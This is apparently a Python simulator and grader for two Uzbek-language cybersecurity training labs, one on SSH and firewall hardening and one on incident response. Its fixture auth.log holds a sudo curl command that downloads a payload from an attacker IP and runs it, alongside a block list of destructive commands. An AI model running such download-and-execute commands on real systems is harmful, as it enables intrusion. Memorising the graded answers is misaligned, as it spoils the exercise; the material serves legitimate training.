"""Virtual laboratoriya terminallari simulyatori (LAB-C2-01, LAB-C3-02).

Terminal holatsiz: frontend buyruqlar tarixini yuboradi, server uni boshidan qayta
o‘ynab holatni tiklaydi. Shu sababli chiqish matni va baholash bir xil mantiqqa tayanadi.
"""
from __future__ import annotations

import re
import shlex
from dataclasses import dataclass, field

MAX_COMMANDS = 200
MAX_COMMAND_LEN = 500


@dataclass
class Check:
    id: str
    sub: str
    title: str
    weight: float
    passed: bool = False


@dataclass
class LabResult:
    score: float
    checks: list[Check]
    penalties: list[str] = field(default_factory=list)

    def as_dict(self) -> dict:
        return {
            "score": self.score,
            "checks": [c.__dict__ for c in self.checks],
            "penalties": self.penalties,
        }


def _norm(cmd: str) -> str:
    cmd = cmd.strip()
    cmd = re.sub(r"^sudo\s+", "", cmd)
    return re.sub(r"\s+", " ", cmd)


def _split_chain(cmd: str) -> list[str]:
    return [p for p in re.split(r"\s*(?:&&|;)\s*", cmd) if p]


# ======================================================================= LAB-C2-01

SSHD_TEMPLATE = """# OpenSSH server configuration — srv-portal-01
Port 22
#ListenAddress 0.0.0.0
PermitRootLogin {root}
MaxAuthTries 6
PubkeyAuthentication yes
PasswordAuthentication {pwd}
PermitEmptyPasswords no
X11Forwarding yes
UsePAM yes
Subsystem sftp /usr/lib/openssh/sftp-server"""


class C2Server:
    def __init__(self) -> None:
        self.permit_root = "yes"
        self.password_auth = "yes"
        self.sshd_restarted_with = None  # (root, pwd) holati restart paytida
        self.ufw_enabled = False
        self.default_in = "allow"
        self.rules: list[tuple[str, str, str]] = []  # (action, port, source)
        self.xrdp_running = True
        self.openssh_upgraded = False
        self.locked_out = False
        self.penalties: list[str] = []

    # ---- yordamchi
    def _port_open_publicly(self, port: str) -> bool:
        if port == "3389" and not self.xrdp_running:
            return False
        if not self.ufw_enabled:
            return True
        for action, p, src in self.rules:
            if p == port:
                return action == "allow" and src == "Anywhere"
        return self.default_in == "allow"

    def _ss(self) -> str:
        lines = ["State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process",
                 "LISTEN  0       128           0.0.0.0:22          0.0.0.0:*      users:((\"sshd\",pid=812,fd=3))",
                 "LISTEN  0       511           0.0.0.0:80          0.0.0.0:*      users:((\"nginx\",pid=1033,fd=6))",
                 "LISTEN  0       511           0.0.0.0:443         0.0.0.0:*      users:((\"nginx\",pid=1033,fd=7))"]
        if self.xrdp_running:
            lines.append("LISTEN  0       2             0.0.0.0:3389        0.0.0.0:*      users:((\"xrdp\",pid=944,fd=11))")
        return "\n".join(lines)

    def _ufw_status(self, verbose: bool) -> str:
        if not self.ufw_enabled:
            return "Status: inactive"
        out = ["Status: active"]
        if verbose:
            out += ["Logging: on (low)", f"Default: {'deny' if self.default_in == 'deny' else 'allow'} (incoming), "
                                         "allow (outgoing), disabled (routed)", ""]
        out += ["To                         Action      From", "--                         ------      ----"]
        for action, port, src in self.rules:
            out.append(f"{port + '/tcp':<26} {action.upper():<11} {src}")
        return "\n".join(out)

    def _ssh_allowed_for_admin(self) -> bool:
        for action, port, src in self.rules:
            if port == "22" and action == "allow":
                return True
        return self.default_in == "allow"

    # ---- buyruqlar
    def run(self, raw: str) -> str:
        if self.locked_out:
            return "Connection to 10.10.20.10 closed by remote host. (SSH sessiyasi uzilgan — laboratoriyani qayta boshlang)"
        outs = [self._run_one(_norm(c)) for c in _split_chain(raw)]
        return "\n".join(o for o in outs if o)

    def _run_one(self, cmd: str) -> str:
        if not cmd:
            return ""
        if cmd in ("help", "?"):
            return "Mavjud buyruqlar: cat, grep, sed, echo, systemctl, service, sshd -t, ss, netstat, ufw, apt, clear"
        if re.match(r"^(cat|less|more|grep\b.*)\s*.*sshd_config", cmd):
            text = SSHD_TEMPLATE.format(root=self.permit_root, pwd=self.password_auth)
            m = re.match(r"^grep (?:-\w+ )*['\"]?([^'\"]+?)['\"]? ", cmd)
            if m:
                pat = m.group(1).lower()
                return "\n".join(line for line in text.splitlines() if pat in line.lower())
            return text
        if "sshd_config" in cmd and re.match(r"^(sed|echo|printf|tee)\b", cmd):
            changed = []
            m = re.search(r"PermitRootLogin\s+(no|yes|prohibit-password|without-password)", cmd.split("/", 2)[-1]
                          if cmd.startswith("sed") else cmd)
            if m:
                self.permit_root = m.group(1)
                changed.append("PermitRootLogin")
            m = re.search(r"PasswordAuthentication\s+(no|yes)", cmd.split("/", 2)[-1] if cmd.startswith("sed") else cmd)
            if m:
                self.password_auth = m.group(1)
                changed.append("PasswordAuthentication")
            return "" if changed else "sed: o‘zgarish topilmadi"
        if re.match(r"^(nano|vi|vim)\b", cmd):
            return "Interaktiv muharrir simulyatorda mavjud emas — sed yoki echo dan foydalaning."
        if re.match(r"^sshd -t$", cmd):
            return ""
        if re.match(r"^(systemctl (restart|reload) (sshd|ssh)(\.service)?|service (sshd|ssh) (restart|reload))$", cmd):
            self.sshd_restarted_with = (self.permit_root, self.password_auth)
            return ""
        if re.match(r"^systemctl status (sshd|ssh)", cmd):
            return "● ssh.service - OpenBSD Secure Shell server\n     Active: active (running)"
        if re.match(r"^systemctl (stop|disable --now|disable) xrdp", cmd):
            if "stop" in cmd or "--now" in cmd:
                self.xrdp_running = False
            return "" if "disable" not in cmd else "Removed /etc/systemd/system/multi-user.target.wants/xrdp.service."
        if re.match(r"^(ss|netstat) -\w+", cmd):
            return self._ss()
        if cmd.startswith("ufw"):
            return self._ufw(cmd)
        if re.match(r"^apt(-get)? (list --upgradable|update)", cmd):
            if "update" in cmd and "list" not in cmd:
                return "Hit:1 http://repo.uz/ubuntu jammy InRelease\nReading package lists... Done\n3 packages can be upgraded."
            if self.openssh_upgraded:
                return "Listing... Done"
            return ("Listing... Done\nopenssh-server/jammy-security 1:8.9p1-3ubuntu0.13 amd64 [upgradable from: 1:8.9p1-3ubuntu0.1]\n"
                    "  ! CVE-2024-6387 (regreSSHion) — CVSS 8.1, masofaviy kod bajarish")
        if re.match(r"^apt(-get)? (-y )?(install (-y )?--only-upgrade (-y )?openssh-server|upgrade|full-upgrade|install (-y )?openssh-server)", cmd):
            self.openssh_upgraded = True
            return ("Reading package lists... Done\nSetting up openssh-server (1:8.9p1-3ubuntu0.13) ...\n"
                    "openssh-server yangilandi.")
        if re.match(r"^rm -rf /( |$)|^chmod -R 777 /|^chmod 777 /etc", cmd):
            self.penalties.append(f"Xavfli buyruq: {cmd}")
            return "Operatsiya xavfsizlik siyosati tomonidan bloklandi (jarima qayd etildi)."
        if cmd in ("clear", "whoami", "hostname", "id") or cmd.startswith("cd "):
            return {"whoami": "root", "hostname": "srv-portal-01", "id": "uid=0(root) gid=0(root)"}.get(cmd, "")
        return f"{cmd.split()[0]}: buyruq simulyatorda qo‘llab-quvvatlanmaydi (help — yordam)"

    def _ufw(self, cmd: str) -> str:
        if cmd in ("ufw status", "ufw status numbered"):
            return self._ufw_status(False)
        if cmd == "ufw status verbose":
            return self._ufw_status(True)
        if re.match(r"^ufw (--force )?enable$", cmd):
            if not self._ssh_allowed_for_admin():
                self.ufw_enabled = True
                self.locked_out = True
                self.penalties.append("ufw SSH ruxsat qoidasisiz yoqildi — administrator serverdan uzildi")
                return "Firewall is active and enabled on system startup\nConnection to 10.10.20.10 closed by remote host."
            self.ufw_enabled = True
            return "Firewall is active and enabled on system startup"
        if cmd == "ufw disable":
            self.ufw_enabled = False
            self.penalties.append("Firewall o‘chirildi (ufw disable)")
            return "Firewall stopped and disabled on system startup"
        m = re.match(r"^ufw default (deny|reject|allow) incoming$", cmd)
        if m:
            self.default_in = "allow" if m.group(1) == "allow" else "deny"
            return f"Default incoming policy changed to '{m.group(1)}'"
        if cmd.startswith("ufw default"):
            return "Default policy changed"
        m = re.match(r"^ufw delete (allow|deny) (\d+)(/tcp)?$", cmd)
        if m:
            self.rules = [r for r in self.rules if not (r[0] == m.group(1) and r[1] == m.group(2))]
            return "Rule deleted"
        m = re.match(r"^ufw (allow|deny|reject|limit) (\d+)(/tcp)?$", cmd)
        if m:
            action = "allow" if m.group(1) in ("allow", "limit") else "deny"
            port = m.group(2)
            if action == "allow" and port == "3389":
                self.penalties.append("RDP 3389 porti hammaga ochildi")
            self._add_rule(action, port, "Anywhere")
            return "Rule added"
        m = re.match(r"^ufw (allow|deny) from (\S+) to any port (\d+)( proto tcp)?$", cmd)
        if m:
            self._add_rule(m.group(1), m.group(3), m.group(2))
            return "Rule added"
        m = re.match(r"^ufw (allow|deny) (?:from )?(\S+)$", cmd)
        if m and re.match(r"^\d+\.\d+\.\d+\.\d+(/\d+)?$", m.group(2)):
            return "Rule added"
        return "ERROR: Invalid syntax"

    def _add_rule(self, action: str, port: str, src: str) -> None:
        self.rules = [r for r in self.rules if not (r[1] == port and r[2] == src)]
        self.rules.append((action, port, src))

    # ---- baholash
    def grade(self) -> LabResult:
        ssh_rules = [r for r in self.rules if r[1] == "22"]
        ssh_restricted = (
            any(a == "allow" and src in ("10.10.99.0/24",) for a, _, src in ssh_rules)
            and not any(a == "allow" and src == "Anywhere" for a, _, src in ssh_rules)
            and self.default_in == "deny"
        )
        checks = [
            Check("root", "c2.1", "PermitRootLogin no", 20, self.permit_root == "no"),
            Check("pwd", "c2.1", "PasswordAuthentication no", 10, self.password_auth == "no"),
            Check("restart", "c2.1", "SSH xizmati yangi konfiguratsiya bilan qayta ishga tushirildi", 10,
                  self.sshd_restarted_with is not None and self.sshd_restarted_with[0] == "no"),
            Check("rdp", "c2.2", "RDP 3389-port tashqaridan yopildi", 15,
                  self.ufw_enabled and not self._port_open_publicly("3389") or not self.xrdp_running),
            Check("ssh22", "c2.2", "22/tcp faqat 10.10.99.0/24 ga ruxsat, default deny incoming", 20, ssh_restricted),
            Check("enable", "c2.2", "ufw xavfsiz tartibda yoqildi (SSH uzilmadi)", 10,
                  self.ufw_enabled and not self.locked_out),
            Check("patch", "c2.3", "Zaif openssh-server paketi yangilandi", 15, self.openssh_upgraded),
        ]
        return _score(checks, self.penalties)


# ======================================================================= LAB-C3-02

AUTH_LOG = """Nov  2 02:58:01 db-gov-02 CRON[3120]: pam_unix(cron:session): session opened for user postgres by (uid=0)
Nov  2 03:01:14 db-gov-02 sshd[3388]: Failed password for invalid user admin from 185.220.101.44 port 50122 ssh2
Nov  2 03:01:16 db-gov-02 sshd[3388]: Failed password for invalid user oracle from 185.220.101.44 port 50131 ssh2
Nov  2 03:01:19 db-gov-02 sshd[3390]: Failed password for backup_user from 185.220.101.44 port 50140 ssh2
Nov  2 03:01:22 db-gov-02 sshd[3390]: Failed password for backup_user from 185.220.101.44 port 50146 ssh2
Nov  2 03:01:25 db-gov-02 sshd[3391]: Failed password for root from 185.220.101.44 port 50152 ssh2
Nov  2 03:02:07 db-gov-02 sshd[3402]: Accepted password for backup_user from 185.220.101.44 port 50199 ssh2
Nov  2 03:02:07 db-gov-02 sshd[3402]: pam_unix(sshd:session): session opened for user backup_user by (uid=0)
Nov  2 03:03:41 db-gov-02 sudo: backup_user : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -s http://185.220.101.44/k -o /tmp/.x/kworkerd
Nov  2 03:03:52 db-gov-02 sudo: backup_user : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/tmp/.x/kworkerd -d
Nov  2 03:10:05 db-gov-02 sshd[3511]: Accepted publickey for dba_admin from 10.10.99.21 port 41822 ssh2"""

NETSTAT = """Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      801/sshd
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      955/postgres
tcp        0      0 10.10.20.15:5432        10.10.20.10:48812       ESTABLISHED 3610/postgres
tcp        0    112 10.10.20.15:51522       185.220.101.44:4444     ESTABLISHED 4721/kworkerd
tcp        0      0 10.10.20.15:22          10.10.99.21:41822       ESTABLISHED 3511/sshd"""

PS = """USER         PID %CPU %MEM    VSZ   RSS TTY  STAT START   TIME COMMAND
root           1  0.0  0.1 167744 11320 ?    Ss   Oct30   0:04 /sbin/init
root         801  0.0  0.0  15428  7240 ?    Ss   Oct30   0:00 sshd: /usr/sbin/sshd -D
postgres     955  0.1  1.2 216800 98412 ?    Ss   Oct30   2:41 /usr/lib/postgresql/16/bin/postgres
backup_+    3402  0.0  0.0  17220  9104 ?    Ss   03:02   0:00 sshd: backup_user@pts/1
root        4721 38.5  0.4 112004 33780 ?    Sl   03:03  91:12 /tmp/.x/kworkerd -d
root        3511  0.0  0.0  17220  9200 ?    Ss   03:10   0:00 sshd: dba_admin@pts/0"""

GOOD_DUMP = "egov_2026-11-01.dump"
BAD_DUMP = "egov_2026-11-02.dump"
GOOD_HASH = "4b9e1d7a2c3f58e06a1b7d9c2e4f6a8b0c1d3e5f7a9b2c4d6e8f0a1b3c5d7e9f"
BAD_HASH_ACTUAL = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
BAD_HASH_EXPECTED = "7c1f0e9d8b2a4c6e8f0a2b4d6c8e0f1a3b5d7c9e1f3a5b7d9c1e3f5a7b9d1c3e"
MALWARE_HASH = "a17f9c2be44d0d8e6b31f5c79a2e0b4d1c8f3a6e9b2d5c7f0a3e6b9d2c5f8a1e"


class C3Server:
    def __init__(self) -> None:
        self.viewed_auth = False
        self.viewed_net = False
        self.evidence_saved = False
        self.evidence_before_kill = False
        self.malware_running = True
        self.malware_file = True
        self.ip_blocked = False
        self.user_locked = False
        self.checked_hashes: set[str] = set()
        self.restored: str | None = None
        self.restored_verified = False
        self.powered_off = False
        self.penalties: list[str] = []

    def run(self, raw: str) -> str:
        if self.powered_off:
            return "Server o‘chirilgan. Operativ xotiradagi dalillar yo‘qotildi."
        outs = [self._run_one(_norm(c)) for c in _split_chain(raw)]
        return "\n".join(o for o in outs if o)

    def _run_one(self, cmd: str) -> str:
        if not cmd:
            return ""
        if cmd in ("help", "?"):
            return ("Mavjud buyruqlar: cat, grep, tail, netstat, ss, ps, ls, cp, sha256sum, kill, ufw, iptables, "
                    "passwd -l, usermod -L, pg_restore, psql, mkdir, clear")
        if re.match(r"^(cat|tail|less|head)( -n ?\d+)? /var/log/auth\.log$", cmd):
            self.viewed_auth = True
            return AUTH_LOG
        m = re.match(r"^grep (?:-\w+ )*['\"]?([^'\"]+?)['\"]? /var/log/auth\.log$", cmd)
        if m:
            self.viewed_auth = True
            pat = m.group(1).lower()
            try:
                rx = re.compile(pat, re.I)
                lines = [line for line in AUTH_LOG.splitlines() if rx.search(line)]
            except re.error:
                lines = [line for line in AUTH_LOG.splitlines() if pat in line.lower()]
            return "\n".join(lines)
        if re.match(r"^(netstat|ss) -\w+", cmd):
            self.viewed_net = True
            if not self.malware_running:
                return "\n".join(line for line in NETSTAT.splitlines() if "4721" not in line)
            return NETSTAT
        if re.match(r"^(ps (aux|-ef)|top -b -n ?1)", cmd):
            if not self.malware_running:
                return "\n".join(line for line in PS.splitlines() if "4721" not in line)
            return PS
        if re.match(r"^lsof -p 4721", cmd):
            return "kworkerd 4721 root txt REG 8,1 33780 /tmp/.x/kworkerd\nkworkerd 4721 root 3u IPv4 TCP 10.10.20.15:51522->185.220.101.44:4444 (ESTABLISHED)"
        if re.match(r"^mkdir (-p )?/root/evidence/?$", cmd):
            return ""
        if re.match(r"^ls (-\w+ )?/tmp/\.x/?$", cmd):
            return "-rwxr-xr-x 1 root root 33780 Nov  2 03:03 kworkerd" if self.malware_file else ""
        m = re.match(r"^(cp|tar|dd)\b.*?/tmp/\.x(/kworkerd)?\b.*?(/root/evidence|evidence)", cmd)
        if m or re.match(r"^cp (-a |-p )?/proc/4721/exe /root/evidence", cmd):
            if not self.malware_file and "/proc/" not in cmd:
                return "cp: '/tmp/.x/kworkerd' ni o‘qib bo‘lmadi: fayl mavjud emas"
            self.evidence_saved = True
            if self.malware_running:
                self.evidence_before_kill = True
            return ""
        if re.match(r"^sha256sum /tmp/\.x/kworkerd$", cmd):
            return f"{MALWARE_HASH}  /tmp/.x/kworkerd" if self.malware_file else "sha256sum: fayl mavjud emas"
        if re.match(r"^rm (-\w+ )*/tmp/\.x", cmd):
            if not self.evidence_saved:
                self.penalties.append("Zararli fayl dalil sifatida saqlanmasdan o‘chirildi")
            self.malware_file = False
            return ""
        m = re.match(r"^(kill|pkill)( -(9|KILL|SIGKILL|15|TERM))? (\S+)$", cmd)
        if m:
            target = m.group(4)
            if target in ("4721", "kworkerd"):
                if not self.malware_running:
                    return f"kill: ({target}) - No such process"
                self.malware_running = False
                return ""
            if target in ("801", "955", "1", "3511"):
                self.penalties.append(f"Muhim tizim jarayoni to‘xtatildi (PID {target})")
                return ""
            return f"kill: ({target}) - No such process"
        if re.match(r"^(killall kworkerd)$", cmd):
            self.malware_running = False
            return ""
        if re.match(r"^ufw (deny|reject) (from |out to |to )?185\.220\.101\.44(/32)?\b", cmd) or \
                re.match(r"^iptables (-I|-A) (INPUT|OUTPUT|FORWARD)( \d+)? .*185\.220\.101\.44.* -j (DROP|REJECT)$", cmd):
            self.ip_blocked = True
            return "Rule added" if cmd.startswith("ufw") else ""
        if re.match(r"^(ufw|iptables)\b", cmd):
            return "Rule added" if cmd.startswith("ufw") else ""
        if re.match(r"^(passwd -l|usermod -L|usermod --lock|chage -E ?0) backup_user$", cmd):
            self.user_locked = True
            return "passwd: password expiry information changed." if cmd.startswith("passwd") else ""
        if re.match(r"^(passwd -l|usermod -L) (root|dba_admin|postgres)$", cmd):
            self.penalties.append("Qonuniy administrator/xizmat hisobi bloklandi")
            return ""
        if re.match(r"^ls (-\w+ )?/var/backups/pg_dump/?$", cmd):
            return ("-rw-r----- 1 postgres postgres 2147483648 Nov  1 23:30 egov_2026-11-01.dump\n"
                    "-rw-r----- 1 postgres postgres 2147480121 Nov  2 03:20 egov_2026-11-02.dump\n"
                    "-rw-r--r-- 1 postgres postgres        180 Nov  1 23:31 SHA256SUMS")
        if re.match(r"^cat /var/backups/pg_dump/SHA256SUMS$", cmd):
            return f"{GOOD_HASH}  {GOOD_DUMP}\n{BAD_HASH_EXPECTED}  {BAD_DUMP}"
        if re.match(r"^(sha256sum -c|cd /var/backups/pg_dump/? && sha256sum -c) (/var/backups/pg_dump/)?SHA256SUMS$", cmd):
            self.checked_hashes.update({GOOD_DUMP, BAD_DUMP})
            return f"{GOOD_DUMP}: OK\n{BAD_DUMP}: FAILED\nsha256sum: WARNING: 1 computed checksum did NOT match"
        m = re.match(r"^sha256sum (/var/backups/pg_dump/)?(egov_2026-11-0[12]\.dump)$", cmd)
        if m:
            name = m.group(2)
            self.checked_hashes.add(name)
            h = GOOD_HASH if name == GOOD_DUMP else BAD_HASH_ACTUAL
            return f"{h}  /var/backups/pg_dump/{name}"
        m = re.match(r"^(pg_restore\b.*|psql\b.*<)\s*(/var/backups/pg_dump/)?(egov_2026-11-0[12]\.dump)$", cmd)
        if m:
            name = m.group(3)
            self.restored = name
            self.restored_verified = name in self.checked_hashes
            if name == BAD_DUMP:
                self.penalties.append("Yaxlitligi buzilgan (tajovuzkor o‘zgartirgan) zaxira tiklandi")
                return "pg_restore: error: could not read input file: invalid archive header\npg_restore: warning: errors ignored on restore: 37"
            return ("pg_restore: connecting to database for restore\npg_restore: creating TABLE \"public.citizens_requests\"\n"
                    "pg_restore: processing data for table \"public.citizens_requests\"\nTiklash muvaffaqiyatli yakunlandi.")
        if re.match(r"^(reboot|shutdown|poweroff|halt|init 0)\b", cmd):
            self.powered_off = True
            self.penalties.append("Server o‘chirildi — operativ xotiradagi raqamli dalillar yo‘qotildi")
            return "Broadcast message: The system is going down for reboot NOW!"
        if cmd in ("clear", "whoami", "hostname") or cmd.startswith("cd "):
            return {"clear": "", "whoami": "root", "hostname": "db-gov-02"}.get(cmd, "")
        return f"{cmd.split()[0]}: buyruq simulyatorda qo‘llab-quvvatlanmaydi (help — yordam)"

    def grade(self) -> LabResult:
        checks = [
            Check("auth", "c3.1", "auth.log tahlil qilindi (brute-force va backup_user kirishi)", 10, self.viewed_auth),
            Check("net", "c3.1", "Tarmoq ulanishlari tekshirildi (netstat/ss)", 10, self.viewed_net),
            Check("evidence", "c3.2", "Zararli fayl jarayon to‘xtatilishidan oldin dalil sifatida saqlandi", 10,
                  self.evidence_before_kill),
            Check("kill", "c3.2", "PID 4721 (kworkerd) to‘xtatildi", 15, not self.malware_running),
            Check("block", "c3.2", "185.220.101.44 firewall’da bloklandi", 15, self.ip_blocked),
            Check("lock", "c3.2", "Buzilgan backup_user hisobi bloklandi", 10, self.user_locked),
            Check("hash", "c3.3", "Zaxira nusxa SHA-256 bilan tekshirildi", 10, GOOD_DUMP in self.checked_hashes),
            Check("restore", "c3.3", "Yaxlit zaxira (egov_2026-11-01.dump) tekshiruvdan so‘ng tiklandi", 20,
                  self.restored == GOOD_DUMP and self.restored_verified),
        ]
        return _score(checks, self.penalties)


# ======================================================================= umumiy

PENALTY_POINTS = 10.0

ENGINES = {"c2": C2Server, "c3": C3Server}


def _score(checks: list[Check], penalties: list[str]) -> LabResult:
    total = sum(c.weight for c in checks)
    got = sum(c.weight for c in checks if c.passed)
    score = max(0.0, got / total * 100 - PENALTY_POINTS * len(penalties))
    return LabResult(score=round(score, 1), checks=checks, penalties=list(penalties))


def _validate(history: list[str]) -> list[str]:
    if len(history) > MAX_COMMANDS:
        raise ValueError(f"Buyruqlar soni {MAX_COMMANDS} dan oshmasligi kerak")
    return [h[:MAX_COMMAND_LEN] for h in history]


def replay(engine: str, history: list[str]):
    server = ENGINES[engine]()
    for cmd in _validate(history):
        server.run(cmd)
    return server


def execute(engine: str, history: list[str], command: str) -> str:
    server = replay(engine, history)
    command = command[:MAX_COMMAND_LEN]
    try:
        shlex.split(command)
    except ValueError:
        return "bash: sintaksis xatosi (yopilmagan qo‘shtirnoq)"
    return server.run(command)


def grade(engine: str, history: list[str]) -> LabResult:
    return replay(engine, history).grade()
